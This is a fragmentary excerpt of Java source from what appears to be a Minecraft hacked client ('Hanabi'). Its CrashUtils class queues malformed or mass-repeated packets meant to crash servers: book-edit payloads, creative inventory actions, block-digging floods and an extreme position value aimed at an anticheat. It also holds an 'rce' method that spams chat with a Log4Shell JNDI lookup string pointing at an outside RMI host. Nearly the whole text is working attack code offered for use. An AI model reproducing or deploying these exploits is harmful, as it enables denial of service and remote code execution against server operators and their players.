...
public class CrashUtils {
    ...
    public void placecrash(ItemStack stack) {
        Hanabi.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement(stack));
    }
    ...
    public void payload1(ItemStack stack) {
        ...
        channel = "MC|BEdit";
        Hanabi.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
    }
    ...
    public void creatandpayload(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        Hanabi.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
    ...
    public void actioncrash(int amount, int range) {
        ...
        while (init < amount) {
            ...
            Hanabi.INSTANCE.packetQueue.add(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.STOP_DESTROY_BLOCK, blockPos, EnumFacing.DOWN));
            init++;
        }
    }
    ...
    public void aac5crash(int amount) {
        int init = 0;
        while (init < amount) {
            Hanabi.INSTANCE.packetQueue.add(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999, 0, true));
            init++;
        }
    }
    ...
    public void rce(int amount) {
        ...
        while (init < amount) {
            Hanabi.INSTANCE.packetQueue.add(new C01PacketChatMessage("{\"petya.exe\":\"${jndi:rmi://google.com/a}\", \"petya.exe\":\"${jndi:rmi://google.com/a}\"x}}"));
            init++;
        }
    }
